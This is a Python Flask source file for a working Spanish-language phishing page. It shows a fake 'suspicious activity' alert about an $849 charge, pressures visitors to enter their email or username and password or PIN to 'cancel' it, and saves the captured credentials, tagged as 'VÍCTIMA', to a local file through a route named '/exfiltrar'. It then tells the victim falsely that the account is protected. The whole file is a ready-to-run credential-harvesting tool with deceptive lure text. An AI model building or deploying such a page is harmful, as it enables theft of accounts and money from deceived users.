from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    return render_template_string("""
    <html>
    <body style="background:#f2f2f2; font-family:sans-serif; text-align:center; padding-top:50px;">
        <div style="background:white; max-width:400px; display:inline-block; padding:30px; border-radius:10px; border-top: 5px solid #d32f2f; box-shadow:0 4px 15px rgba(0,0,0,0.1);">
            <h2 style="color:#d32f2f; margin-top:0;">⚠️ ACTIVIDAD SOSPECHOSA</h2>
            <p style="color:#555;">Se ha detectado un intento de cargo por <b>$849.00 USD</b> desde una ubicación desconocida.</p>
            <p style="background:#fff3cd; padding:10px; border-radius:5px; font-size:14px;">Para cancelar esta transacción y proteger su saldo, verifique su identidad de inmediato.</p>
            <form action="/exfiltrar" method="POST">
                <input type="text" name="u" placeholder="Usuario de Red / Email" required style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:5px;"><br>
                <input type="password" name="p" placeholder="Clave de Interno (PIN/Password)" required style="width:100%; padding:12px; margin:10px 0; border:1px solid #ccc; border-radius:5px;"><br>
                <button type="submit" style="background:#d32f2f; color:white; border:none; width:100%; padding:15px; border-radius:5px; font-weight:bold; cursor:pointer; margin-top:10px;">CANCELAR TRANSACCIÓN Y BLOQUEAR</button>
            </form>
            <p style="font-size:11px; color:#999; margin-top:20px;">Seguridad Central - Terminal #8409</p>
        </div>
    </body>
    </html>
    """)

@app.route('/exfiltrar', methods=['POST'])
def exfiltrar():
    user = request.form.get('u')
    pw = request.form.get('p')
    with open('base_de_datos.txt', 'a') as f:
        f.write(f"VÍCTIMA -> User: {user} | Pass: {pw}\n")
    return "TRANSACCIÓN CANCELADA EXITOSAMENTE. Su cuenta ha sido protegida. Puede cerrar esta ventana."

if __name__ == "__main__":
    app.run()
